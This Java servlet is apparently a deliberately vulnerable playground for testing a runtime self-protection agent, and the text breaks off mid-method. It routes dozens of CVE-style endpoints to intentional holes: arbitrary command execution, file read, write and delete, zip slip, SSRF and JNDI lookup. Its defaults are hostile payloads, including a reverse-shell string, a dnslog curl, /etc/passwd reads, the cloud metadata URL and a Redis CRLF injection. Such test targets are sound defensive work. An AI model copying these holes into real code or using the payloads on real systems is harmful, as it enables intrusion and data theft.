package io.ohmyrasp.playground;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.MultipartConfig;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.Part;
import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.rmi.Remote;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Hashtable;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javax.script.AbstractScriptEngine;
import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngineFactory;
import javax.script.ScriptException;
import javax.script.SimpleBindings;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import org.apache.commons.jxpath.JXPathContext;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;
import org.springframework.beans.factory.xml.XmlBeanDefinitionReader;
import org.springframework.context.support.GenericApplicationContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

@WebServlet(
    name = "VulnerableServlet",
    urlPatterns = {
      "/rasp/*",
      "/druid/*",
      "/geoserver/*",
      "/wls-wsat/*",
      "/uddiexplorer/*",
      "/ws_utc/*",
      "/api/*",
      "/fileserver/*",
      "/jars/*",
      "/dataSetParam/*",
      "/dataease/*",
      "/nacos/*",
      "/solr/*",
      "/fastjson",
      "/jmreport/*",
      "/h2-console/*",
      "/cas/*",
      "/hello/*",
      "/neo4j-shell/*",
      "/admin/message.jsp",
      "/invoker/*",
      "/jbossmq-httpil/*",
      "/flex2gateway/*",
      "/CFIDE/*",
      "/cf_scripts/*",
      "*.action",
      "/exploit",
      "/graphql",
      "/gremlin",
      "/gs-guide-websocket/*",
      "/onlinePreview",
      "/test",
      "/"
    })
@MultipartConfig
public final class VulnerableServlet extends HttpServlet {
  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.setCharacterEncoding(StandardCharsets.UTF_8.name());
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    response.setHeader("Access-Control-Allow-Headers", "Content-Type, User-Agent");
    response.setContentType("text/plain");
    String action =
        "/test".equals(request.getServletPath())
            ? "/cxf-aegis-test"
            : "/onlinePreview".equals(request.getServletPath())
                ? "/onlinePreview"
                : "/fastjson".equals(request.getServletPath())
                    ? "/fastjson"
                    : "/exploit".equals(request.getServletPath())
                        ? "/exploit"
                        : "/graphql".equals(request.getServletPath())
                            ? "/graphql"
                            : "/gremlin".equals(request.getServletPath())
                                ? "/gremlin"
                                : jiraContactAdministratorsRequest(request)
                                    ? "/jira-contact-administrators"
                                    : weblogicWeakPasswordFileReadRequest(request)
                                        ? "/weblogic-file-read"
                                        : dubboHttpInvokerRequest(request)
                                            ? "/dubbo-http-invoker"
                                            : sparkRestSubmissionRequest(request)
                                                ? "/spark-rest-submission"
                                            : request.getServletPath().endsWith(".action")
                                                ? "/struts-action"
                                                : springCloudGatewayRouteRequest(request)
                                                    ? "/spring-cloud-gateway-route"
                                                    : springMessagingSockJsRequest(request)
                                                        ? "/spring-messaging-stomp-selector"
                                                        : springDataRestJsonPatchRequest(request)
                                                            ? "/spring-data-rest-json-patch"
                                                            : confluenceMacroPreviewRequest(request)
                                                            ? "/confluence-macro-preview"
                                                            : meterSphereTestCaseListRequest(request)
                                                            ? "/metersphere-testcase-list"
                                                            : meterSpherePluginAddRequest(request)
                                                                ? "/metersphere-plugin-add"
                                                                : xxlJobRunRequest(request)
                                                                    ? "/xxl-job-run"
                                                                    : xxlJobHessianApiRequest(request)
                                                                        ? "/xxl-job-hessian-api"
                                                                        : ofbizXmlRpcRequest(request)
                                                                            ? "/ofbiz-xmlrpc"
                                                                            : dataEaseDatasourceValidateRequest(request)
                                                                                ? "/dataease-datasource-validate"
                                                                                : dataEaseUserInfoRequest(request)
                                                                                    ? "/dataease-user-info"
                                                                                    : ofbizProgramExportRequest(request)
                                                                                        ? "/ofbiz-program-export"
                                                                                        : strutsXmlRestRequest(request)
                                                                                            ? "/struts-xml-rest"
                                                                                            : activeMqObjectMessageBrowseRequest(request)
                                                                                                ? "/activemq-object-message-browse"
                                                                                                : jenkinsCliSignedObjectRequest(request)
                                                                                                    ? "/jenkins-cli-signed-object"
                                                                                                    : tomcatSessionDeserializeRequest(request)
                                                                                                        ? "/tomcat-session-deserialize"
                                                                                                        : unomiContextRequest(request)
                                                                                                            ? "/context.json"
                                                                                                            : request.getPathInfo() == null
                                                                                                                ? "/ui"
                                                                                                                : request.getPathInfo();
    boolean agentRequestEntered = false;
    try {
      if (!action.equals("/blocked")) {
        agentRequestEntered = enterAgentRequest(request, response);
      }
      String result =
          switch (action) {
            case "/", "/ui" -> renderUi(request);
            case "/blocked" -> renderBlocked(request);
            case "/cases" -> testCasesJson();
            case "/environments" -> environmentsJson();
            case "/labs" -> LabCatalog.json();
            case "/health" -> "ok";
            case "/request" -> "request inspected";
            case "/command" -> runCommand(request);
            case "/command/common" -> runCommandLiteral(List.of("echo", "bash -i >& /dev/tcp/127.0.0.1/4444"));
            case "/command/error" -> runCommandLiteral(List.of("sh", "-c", "echo 'unterminated"));
            case "/command/dnslog" -> runCommandLiteral(List.of("echo", "curl http://probe.dnslog.cn/a"));
            case "/command/reflect" -> runCommandReflect();
            case "/file/read" -> readFile(request);
            case "/file/read-sensitive" -> readFilePath(Path.of("/etc/passwd"));
            case "/file/read-outside" -> readFilePath(Path.of("/etc/hosts"));
            case "/weblogic-file-read" -> weblogicWeakPasswordFileRead(request);
            case "/file/write" -> writeFile(request);
            case "/file/write-reflect" -> writeFileReflect();
            case "/archive" -> extractArchive(request);
            case "/onlinePreview" -> kkFileViewOnlinePreview(request);
            case "/file/delete" -> deleteFile(request);
            case "/directory" -> listDirectory(request);
            case "/directory/root" -> listDirectoryPath("/root");
            case "/ssrf" -> outboundUrl(request);
            case "/dns" -> dnsLookup(request);
            case "/jndi" -> jndiLookup(request);
            case "/jaas/config" -> jaasConfig(request);
            case "/classloader/url" -> remoteUrlClassLoader(request);
            case "/classloader/rmi-codebase" -> rmiClassLoaderCodebase(request);
            case "/spring/config" -> loadSpringConfig(request);
            case "/spring-cloud-gateway-route" -> springCloudGatewayRouteConfig(request);
            case "/spring-messaging-stomp-selector" -> springMessagingSockJs(request);
            case "/spring-data-rest-json-patch" -> springDataRestJsonPatch(request);
            case "/confluence-macro-preview" -> confluenceMacroPreview(request);
            case "/metersphere-testcase-list" -> meterSphereTestCaseList(request);
            case "/metersphere-plugin-add" -> meterSpherePluginAdd(request);
            case "/xxl-job-run" -> xxlJobRun(request);
            case "/xxl-job-hessian-api" -> xxlJobHessianApi(request);
            case "/ofbiz-xmlrpc" -> ofbizXmlRpc(request);
            case "/dataease-datasource-validate" -> dataEaseDatasourceValidate(request);
            case "/dataease-user-info" -> dataEaseUserInfo(request);
            case "/ofbiz-program-export" -> ofbizProgramExport(request);
            case "/struts-xml-rest" -> strutsXmlRest(request);
            case "/activemq-object-message-browse" -> activeMqObjectMessageBrowse(request);
            case "/jenkins-cli-signed-object" -> jenkinsCliSignedObject(request);
            case "/tomcat-session-deserialize" -> tomcatSessionDeserialize(request);
            case "/jmx/invoke" -> invokeJmxRemoteConfig(request);
            case "/jmx/write" -> invokeJmxScriptWrite(request);
            case "/sql" -> sqlQuery(request);
            case "/h2/sql" -> h2Sql(request);
            case "/h2/jdbc-init" -> h2JdbcInit(request);
            case "/jdbc/mysql" -> mysqlJdbcUrl(request);
            case "/deserialize" -> deserialize();
            case "/deserialize/polymorphic" -> polymorphicType(request);
            case "/dubbo-http-invoker" -> dubboHttpInvoker(request);
            case "/amf" -> {
              if ("/flex2gateway".equals(request.getServletPath())) {
                yield coldfusionAmfDeserialize(request);
              }
              yield "unknown action: " + action;
            }
            case "/gremlin" -> hugeGraphGremlin(request);
            case "/jira-contact-administrators" -> jiraContactAdministrators(request);
            case "/xml/decoder" -> xmlDecoderRuntime(request);
            case "/xml/decoder-webshell" -> xmlDecoderWebshell(request);
            case "/cxf-aegis-test" -> cxfAegisXopAttachment(request);
            case "/spel" -> evaluateSpel(request);
            case "/script/jsr223" -> evaluateJsr223(request);
            case "/xpath" -> evaluateXPath(request);
            case "/jxpath" -> evaluateJXPath(request);
            case "/java/compile" -> compileJavaSource(request);
            case "/template/velocity" -> renderVelocity(request);
            case "/spark-rest-submission" -> sparkRestSubmission(request);
            case "/xxe" -> parseXxe(request);
            case "/wms" -> {
              if ("/geoserver".equals(request.getServletPath())) {
                yield geoserverWmsJiffle(request);
              }
              yield "unknown action: " + action;
            }
            case "/CoordinatorPortType" -> {
              if ("/wls-wsat".equals(request.getServletPath())) {
                yield weblogicWorkContextXmlDecoder(request);
              }
              yield "unknown action: " + action;
            }
            case "/SearchPublicRegistries.jsp" -> {
              if ("/uddiexplorer".equals(request.getServletPath())) {
                yield weblogicUddiExplorerSsrf(request);
              }
              yield "unknown action: " + action;
            }
            case "/administrator/enter.cfm" -> {
              if ("/CFIDE".equals(request.getServletPath())) {
                yield "coldfusion-locale=" + value(request, "locale", "en");
              }
              yield "unknown action: " + action;
            }
            case "/adminapi/accessmanager.cfc" -> {
              if ("/CFIDE".equals(request.getServletPath())) {
                yield coldfusionWddxAccessManager(request);
              }
              yield "unknown action: " + action;
            }
            case "/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc" -> {
              if ("/cf_scripts".equals(request.getServletPath())) {
                yield "coldfusion-iedit=" + value(request, "_variables", "");
              }
              yield "unknown action: " + action;
            }
            case "/de2api/datasource/types" -> {
              if ("/dataease".equals(request.getServletPath())) {
                yield "{\"code\":0,\"data\":[\"folder\",\"API\",\"Excel\",\"mysql\",\"h2\"]}";
              }
              yield "unknown action: " + action;
            }
            case "/jsonws/invoke" -> {
              if ("/api".equals(request.getServletPath())) {
                yield "liferay-jsonws=" + value(request, "cmd", "");
              }
              yield "unknown action: " + action;
            }
            case "/geojson" -> {
              if ("/api".equals(request.getServletPath())) {
                yield metabaseGeojson(request);
              }
              yield "unknown action: " + action;
            }
            case "/setup/validate" -> {
              if ("/api".equals(request.getServletPath())) {
                yield metabaseSetupValidate(request);
              }
              yield "unknown action: " + action;
            }
            case "/verification", "/verification/", "/verification;swagger-ui", "/verification;swagger-ui/" -> {
              if ("/dataSetParam".equals(request.getServletPath())) {
                yield ajReportDataSetParamVerification(request);
              }
              yield "unknown action: " + action;
            }
            case "/openwire" -> {
              if ("/api".equals(request.getServletPath())) {
                yield activeMqOpenWireProtocolClass(request);
              }
              yield "unknown action: " + action;
            }
            case "/rest_j/v1/data-source-manager/op/connect/json" -> {
              if ("/api".equals(request.getServletPath())) {
                yield linkisDatasourceConnect(request);
              }
              yield "unknown action: " + action;
            }
            case "/v1/cs/ops/derby" -> {
              if ("/nacos".equals(request.getServletPath())) {
                yield nacosDerbyOps(request);
              }
              yield "unknown action: " + action;
            }
            case "/v1/auth/users" -> {
              if ("/nacos".equals(request.getServletPath())) {
                yield nacosAuthUsers(request);
              }
              yield "unknown action: " + action;
            }
            case "/admin/cores" -> {
              if ("/solr".equals(request.getServletPath())) {
                yield solrAdminCores(request);
              }
              yield "unknown action: " + action;
            }
            case "/struts-action" -> strutsAction(request);
            case "/fastjson" -> fastjsonParse(request);
            case "/exploit" -> jacksonExploit(request);
            case "/graphql" -> skyWalkingGraphql(request);
            case "/context.json" -> unomiContext(request);
            case "/queryFieldBySql" -> {
              if ("/jmreport".equals(request.getServletPath())) {
                yield jimuReportQueryFieldBySql(request);
              }
              yield "unknown action: " + action;
            }
            case "/indexer/v1/sampler" -> {
              if ("/druid".equals(request.getServletPath())) {
                yield druidKafkaSamplerJaas(request);
              }
              yield "unknown action: " + action;
            }
            case "/login" -> {
              if ("/cas".equals(request.getServletPath())) {
                yield casLogin(request);
              }
              yield "unknown action: " + action;
            }
            case "/setSessionVariable" -> {
              if ("/neo4j-shell".equals(request.getServletPath())) {
                yield neo4jShellSetSessionVariable(request);
              }
              yield "unknown action: " + action;
            }
            case "/readonly" -> {
              if ("/invoker".equals(request.getServletPath())) {
                yield jbossHttpObjectStream(request, "ReadOnlyAccessFilter");
              }
              yield "unknown action: " + action;
            }
            case "/JMXInvokerServlet" -> {
              if ("/invoker".equals(request.getServletPath())) {
                yield jbossHttpObjectStream(request, "JMXInvokerServlet");
              }
              yield "unknown action: " + action;
            }
            case "/HTTPServerILServlet" -> {
              if ("/jbossmq-httpil".equals(request.getServletPath())) {
                yield jbossHttpObjectStream(request, "HTTPServerILServlet");
              }
              yield "unknown action: " + action;
            }
            case "/login.do" -> {
              if ("/h2-console".equals(request.getServletPath())) {
                yield h2ConsoleLogin(request);
              }
              yield "unknown action: " + action;
            }
            case "/query.do" -> {
              if ("/h2-console".equals(request.getServletPath())) {
                yield h2ConsoleQuery(request);
              }
              yield "unknown action: " + action;
            }
            case "/resources/setting/keystore" -> {
              if ("/ws_utc".equals(request.getServletPath())) {
                yield weblogicWsUtcKeystoreUpload(request);
              }
              yield "unknown action: " + action;
            }
            case "/upload" -> {
              if ("/jars".equals(request.getServletPath())) {
                yield flinkJarUpload(request);
              }
              yield "unknown action: " + action;
            }
            case "/jolokia", "/jolokia/" -> {
              if ("/api".equals(request.getServletPath())) {
                yield activemqJolokiaMBeanInvoke(request);
              }
              yield "unknown action: " + action;
            }
            default -> {
              if ("/fileserver".equals(request.getServletPath())) {
                yield activemqFileserver(request);
              }
              if (action.startsWith("/policy/")) {
                yield triggerPolicy(action.substring("/policy/".length()), request);
              }
              yield "unknown action: " + action;
            }
          };
      if (action.equals("/") || action.equals("/ui") || action.equals("/blocked")) {
        response.setContentType("text/html");
      } else if (action.equals("/cases") || action.equals("/environments") || action.equals("/labs")) {
        response.setContentType("application/json");
      }
      try (PrintWriter writer = response.getWriter()) {
        writer.println(result);
      }
    } catch (Exception e) {
      if (isOhMyRaspBlock(e)) {
        return;
      }
      response.setStatus(500);
      try (PrintWriter writer = response.getWriter()) {
        writer.println(e.getClass().getName() + ": " + e.getMessage());
      }
    } finally {
      if (agentRequestEntered) {
        exitAgentRequest();
      }
    }
  }

  @Override
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    doGet(request, response);
  }

  @Override
  protected void service(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String method = request.getMethod();
    if (springDataRestJsonPatchRequest(request) && "PATCH".equalsIgnoreCase(method)) {
      doGet(request, response);
      return;
    }
    if (tomcatDefaultServletPutRequest(request) && "PUT".equalsIgnoreCase(method)) {
      doGet(request, response);
      return;
    }
    if ("/fileserver".equals(request.getServletPath())
        && ("MOVE".equalsIgnoreCase(method)
            || "COPY".equalsIgnoreCase(method)
            || "PUT".equalsIgnoreCase(method))) {
      doGet(request, response);
      return;
    }
    super.service(request, response);
  }

  @Override
  protected void doOptions(HttpServletRequest request, HttpServletResponse response) {
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    response.setHeader("Access-Control-Allow-Headers", "Content-Type, User-Agent");
    response.setStatus(204);
  }

  private static String runCommand(HttpServletRequest request) throws Exception {
    List<String> command = new ArrayList<>();
    command.add(value(request, "cmd", "sh"));
    String[] args = request.getParameterValues("arg");
    if (args != null) {
      command.addAll(List.of(args));
    }
    ProcessBuilder processBuilder = new ProcessBuilder(command).redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of());
    Process process = processBuilder.start();
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String runCommandLiteral(List<String> command) throws Exception {
    ProcessBuilder processBuilder = new ProcessBuilder(command).redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of());
    Process process = processBuilder.start();
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String runCommandReflect() throws Exception {
    ProcessBuilder processBuilder = new ProcessBuilder("id").redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of("java.lang.reflect.Method", "io.ohmyrasp.playground.VulnerableServlet"));
    Method start = ProcessBuilder.class.getMethod("start");
    Process process = (Process) start.invoke(processBuilder);
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String readFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/etc/passwd"));
    return readFilePath(path);
  }

  private static String readFilePath(Path path) throws IOException {
    try {
      hook("beforePathRead", new Class<?>[] {Object.class}, path);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    return firstLine(Files.readString(path));
  }

  private static boolean weblogicWeakPasswordFileReadRequest(HttpServletRequest request) {
    return requestPathWithoutContext(request).equals("/hello/file.jsp");
  }

  private static String weblogicWeakPasswordFileRead(HttpServletRequest request)
      throws IOException {
    return readFile(request);
  }

  private static String writeFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/usr/local/tomcat/webapps/ROOT/uploaded.jsp"));
    try {
      hook("beforePathWrite", new Class<?>[] {Object.class, List.class}, path, List.of());
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    Files.createDirectories(path.getParent());
    Files.writeString(path, value(request, "content", "<% out.println(\"ohmyrasp\"); %>"));
    return "wrote " + path;
  }

  private static String writeFileReflect() throws Exception {
    String path = "/usr/local/tomcat/webapps/ROOT/reflect.jsp";
    hook(
        "beforeFileWrite",
        new Class<?>[] {String.class, List.class},
        path,
        List.of("java.lang.reflect.Method", "io.ohmyrasp.playground.VulnerableServlet"));
    Constructor<FileOutputStream> constructor = FileOutputStream.class.getConstructor(String.class);
    try (OutputStream output = constructor.newInstance(path)) {
      output.write("<% out.println(\"reflect\"); %>".getBytes(StandardCharsets.UTF_8));
    }
    return "wrote " + path;
  }

  private static String extractArchive(HttpServletRequest request) throws IOException {
    String entryName = value(request, "entry", "../escaped/archive.txt");
    byte[] archive = zipArchive(entryName, "archive payload");
    Path root = Path.of("/tmp/ohmyrasp-archive/root");
    try (ZipInputStream input = new ZipInputStream(new ByteArrayInputStream(archive))) {
      ZipEntry entry = input.getNextEntry();
      if (entry == null) {
        return "empty archive";
      }
      Path target = root.resolve(entry.getName());
      Files.createDirectories(target.getParent());
      Files.copy(input, target, StandardCopyOption.REPLACE_EXISTING);
      return "extracted " + entry.getName() + " to " + target;
    }
  }

  private static String kkFileViewOnlinePreview(HttpServletRequest request) throws IOException {
    String entryName = value(request, "entry", kkFileViewZipSlipEntry());
    byte[] archive = kkFileViewZipSlipArchive(entryName);
    Path root =
        Path.of(
            "/tmp/ohmyrasp-kkfileview/preview/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z");
    int extracted = 0;
    try (ZipInputStream input = new ZipInputStream(new ByteArrayInputStream(archive))) {
      ZipEntry entry;
      while ((entry = input.getNextEntry()) != null) {
        Path target = root.resolve(entry.getName());
        Files.createDirectories(target.getParent());
        Files.copy(input, target, StandardCopyOption.REPLACE_EXISTING);
        input.closeEntry();
        extracted++;
      }
    }
    return "kkfileview-preview=" + value(request, "url", "test.zip") + " extracted=" + extracted;
  }

  private static byte[] zipArchive(String entryName, String content) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    try (ZipOutputStream output = new ZipOutputStream(bytes)) {
      output.putNextEntry(new ZipEntry(entryName));
      output.write(content.getBytes(StandardCharsets.UTF_8));
      output.closeEntry();
    }
    return bytes.toByteArray();
  }

  private static byte[] kkFileViewZipSlipArchive(String entryName) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    try (ZipOutputStream output = new ZipOutputStream(bytes)) {
      output.putNextEntry(new ZipEntry("test"));
      output.write("vulhub".getBytes(StandardCharsets.UTF_8));
      output.closeEntry();
      output.putNextEntry(new ZipEntry(entryName));
      output.write("import os\nos.system('touch /tmp/success')\n".getBytes(StandardCharsets.UTF_8));
      output.closeEntry();
    }
    return bytes.toByteArray();
  }

  private static String kkFileViewZipSlipEntry() {
    return "../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py";
  }

  private static String deleteFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/tmp/ohmyrasp-delete-target.txt"));
    if (Boolean.parseBoolean(value(request, "touch", "true"))) {
      Files.writeString(path, "delete target");
    }
    try {
      hook("beforePathDelete", new Class<?>[] {Object.class}, path);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    return "deleted=" + path.toFile().delete();
  }

  private static String listDirectory(HttpServletRequest request) {
    return listDirectoryPath(value(request, "path", "/etc"));
  }

  private static String listDirectoryPath(String path) {
    try {
      hook("beforeDirectoryList", new Class<?>[] {Object.class, List.class}, path, List.of());
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    File[] files = new File(path).listFiles();
    return "entries=" + (files == null ? 0 : files.length);
  }

  private static String outboundUrl(HttpServletRequest request) throws IOException {
    URL url = URI.create(value(request, "url", "http://169.254.169.254/latest/meta-data/")).toURL();
    try {
      hook("beforeUrlOpen", new Class<?>[] {Object.class}, url);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    var connection = url.openConnection();
    connection.setConnectTimeout(200);
    connection.setReadTimeout(200);
    try (var stream = connection.getInputStream()) {
      return firstLine(new String(stream.readNBytes(80), StandardCharsets.UTF_8));
    } catch (IOException e) {
      return "open failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static String metabaseGeojson(HttpServletRequest request) throws Exception {
    String target = value(request, "url", "file:////etc/passwd");
    URL url = URI.create(target).toURL();
    if ("file".equalsIgnoreCase(url.getProtocol())) {
      hook("beforeFileRead", new Class<?>[] {String.class}, target);
    }
    var connection = url.openConnection();
    connection.setConnectTimeout(200);
    connection.setReadTimeout(200);
    try (var stream = connection.getInputStream()) {
      return "metabase-geojson=" + firstLine(new String(stream.readNBytes(80), StandardCharsets.UTF_8));
    }
  }

  private static String metabaseSetupValidate(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = metabaseSetupValidateBody();
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "metabase-setup-validate=" + body.length();
  }

  private static String weblogicUddiExplorerSsrf(HttpServletRequest request) throws Exception {
    String target =
        value(
            request,
            "operator",
            "http://172.19.0.2:6379/test%0D%0A%0D%0Aconfig%20set%20dir%20/etc/%0D%0Asave");
    URL url = URI.create(target).toURL();
    hook("beforeUrlOpen", new Class<?>[] {Object.class}, url);
    return "weblogic-uddi-operator=" + url.getHost();
  }

  private static String weblogicWsUtcKeystoreUpload(HttpServletRequest request) throws Exception {
    String filename = value(request, "filename", "shell.jsp");
    hook("beforeFileUpload", new Class<?>[] {String.class}, filename);
    return "weblogic-ws-utc-keystore=" + filename;
  }

  private static String dnsLookup(HttpServletRequest request) throws IOException {
    String host = value(request, "host", "probe.dnslog.cn");
    try {
      hook("beforeDnsLookup", new Class<?>[] {String.class}, host);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    InetAddress[] addresses = InetAddress.getAllByName(host);
    return "addresses=" + addresses.length;
  }

  private static String jndiLookup(HttpServletRequest request) throws Exception {
    String name = value(request, "name", "ldap://127.0.0.1:1389/a");
    hook("beforeJndiLookup", new Class<?>[] {Object.class}, name);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
    env.put("com.sun.jndi.ldap.connect.timeout", "200");
    env.put("com.sun.jndi.ldap.read.timeout", "200");
    try {
      new InitialContext(env).lookup(name);
      return "lookup completed";
    } catch (Exception e) {
      return "lookup failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static String jaasConfig(HttpServletRequest request) throws Exception {
    String provider = value(request, "provider", "ldap://java-chains:50389/x");
    String config =
        value(
            request,
            "config",
            "com.sun.security.auth.module.JndiLoginModule required "
                + "user.provider.url=\""
                + provider
                + "\" useFirstPass=\"true\" serviceName=\"x\";");
    hook("beforeJaasConfig", new Class<?>[] {Object.class}, config);
    return "jaas-config=" + firstLine(config);
  }

  private static String druidKafkaSamplerJaas(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = druidKafkaSamplerBody(kafkaJndiLoginModuleConfig());
    }
    List<String> configs = jsonStringFieldValues(body, "sasl.jaas.config");
    if (configs.isEmpty()) {
      configs = List.of(kafkaJndiLoginModuleConfig());
    }
    for (String config : configs) {
      hook(
          "beforeSyntheticJaasConfig",
          new Class<?>[] {
            String.class,
            String.class,
            String.class,
            Map.class,
            Map.class,
            String.class,
            Object.class,
            String.class
          },
          request.getMethod(),
          "/druid/indexer/v1/sampler",
          valueOrDefault(request.getQueryString(), "for=connect"),
          Map.of("for", List.of(value(request, "for", "connect"))),
          Map.of(
              "content-type",
              valueOrDefault(request.getHeader("Content-Type"), "application/json"),
              "user-agent",
              valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
          body,
          config,
          "KafkaSasl");
    }
    return "druid-kafka-jaas-configs=" + configs.size();
  }

  private static String hugeGraphGremlin(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = hugeGraphGremlinBody();
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "hugegraph-gremlin=" + body.length();
  }

  private static boolean jiraContactAdministratorsRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = requestPathWithoutContext(request);
    return path.equals("/secure/ContactAdministrators.jspa")
        || path.equals("/secure/ContactAdministrators!default.jspa");
  }

  private static String jiraContactAdministrators(HttpServletRequest request) throws Exception {
    String subject = value(request, "subject", "help");
    Map<String, List<String>> parameters =
        Map.of(
            "from",
            List.of(value(request, "from", "test@test.com")),
            "subject",
            List.of(subject),
            "details",
            List.of(value(request, "details", "v")),
            "atl_token",
            List.of(value(request, "atl_token", "token")));
    hook(
        "beforeSyntheticHttpRequest",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        parameters,
        Map.of(
            "content-type",
            valueOrDefault(
                request.getHeader("Content-Type"), "application/x-www-form-urlencoded"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
    return "jira-contact-template=" + subject.length();
  }

  private static boolean unomiContextRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
